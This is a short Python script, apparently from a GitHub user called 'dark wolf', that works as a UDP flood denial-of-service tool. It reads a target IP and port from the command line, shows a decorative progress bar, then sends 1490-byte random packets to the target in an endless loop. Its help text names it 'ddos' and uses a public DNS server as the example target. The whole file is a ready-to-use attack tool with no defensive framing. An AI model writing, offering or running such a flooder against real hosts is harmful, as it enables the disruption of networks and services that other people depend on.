#!/usr/local/bin/python3.8
import time
from termcolor import colored
import sys
import socket
import random
print(colored("""
developer:dark wolf

github:https://github.com/darkwlf

developed after tehran earthquake :/

good luck!

""","green"))
#socket connect
##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
#get ip and port from user
ip = sys.argv[1]
port = int(sys.argv[2])
if ip == "help":
    print("""
how to use:
  ddos <ip> <port>
  like: ddos 8.8.8.8 80

""")
############
print (colored("[                    ] 0% ","blue"))
time.sleep(1)
print (colored("[=====               ] 25%","red"))
time.sleep(1)
print (colored("[==========          ] 50%","green"))
time.sleep(1)
print (colored("[===============     ] 75%","blue"))
time.sleep(1)
print (colored("[====================] 100%","red"))
time.sleep(1)
sent = 0
while True:
     #send packets
     sock.sendto(bytes,(ip,port))
     sent = sent + 1
     port = port
     print (colored("Sent %s packet to %s throught port:%s"%(sent,ip,port),"green"))
     if port == 65534:
        port = 1
